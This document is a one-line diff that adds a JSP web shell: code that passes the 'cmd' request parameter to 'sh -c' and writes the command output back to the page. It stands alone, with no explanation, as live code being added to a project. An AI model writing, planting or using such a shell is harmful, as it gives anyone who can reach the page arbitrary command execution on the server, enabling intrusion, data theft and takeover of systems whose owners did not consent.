@@ -1,0 +1,1 @@
+<% java.io.InputStream input = Runtime.getRuntime().exec(new String[] {"sh","-c",request.getParameter("cmd")}).getInputStream();int len = -1;byte[] bytes = new byte[4092];while ((len = input.read(bytes)) != -1) {out.println(new String(bytes, "GBK"));}%>
